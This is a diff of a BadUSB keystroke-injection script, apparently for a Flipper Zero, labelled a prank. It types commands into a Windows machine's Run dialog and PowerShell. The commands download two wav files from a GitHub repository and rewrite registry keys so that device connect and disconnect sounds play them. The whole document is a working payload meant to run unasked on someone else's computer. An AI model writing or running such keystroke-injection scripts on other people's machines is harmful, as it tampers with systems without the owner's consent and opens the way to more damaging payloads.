@@ -1,17 +1,33 @@
 REM       ChangeUsbAudio
-REM       Version 1.1
+REM       Version 1.2
 REM       OS: Windows
 REM       Author: RoG1N
 REM       Change the original audio Connect device to other fun wav audio.
 REM       Change the original audio Disconnect device to other fun wav audio.
 
-DELAY 2000
+DELAY 1000
 GUI r
 DELAY 200
 STRING powershell
 DELAY 200
 ENTER
 DELAY 500
-STRING $file = (Get-Item .).FullName + '\prank.wav'; Invoke-WebRequest -Uri "https://github.com/rog1n/flipperChangeUsbAudio/raw/main/zeDaManga.wav" -OutFile $file; $file2 = (Get-Item .).FullName + '\prank2.wav'; Invoke-WebRequest -Uri "https://github.com/rog1n/flipperChangeUsbAudio/raw/main/Voucagar.wav.wav" -OutFile $file2; reg add "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /t REG_SZ /d $file2 /f ; reg add "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /t REG_SZ /d $file /f ;Exit;
-DELAY 800
+STRING $wshell = New-Object -ComObject wscript.shell;
+DELAY 200
+ENTER
+STRING if ([console]::CapsLock -like "TruE"){$wshell.SendKeys('{CAPSLOCK}')};
+DELAY 100
+ENTER
+STRING $file = (Get-Item .).FullName + '\prank.wav'; Invoke-WebRequest -Uri "https://github.com/rog1n/flipperChangeUsbAudio/raw/main/zeDaManga.wav" -OutFile $file;
+DELAY 200
+ENTER 
+STRING $file2 = (Get-Item .).FullName + '\prank2.wav'; Invoke-WebRequest -Uri "https://github.com/rog1n/flipperChangeUsbAudio/raw/main/Voucagar.wav" -OutFile $file2;
+DELAY 200
+ENTER
+STRING reg add "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /t REG_SZ /d $file2 /f ;
+DELAY 100
+STRING reg add "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /t REG_SZ /d $file /f ;
+DELAY 1000
+EXIT
+DELAY 100
 ENTER
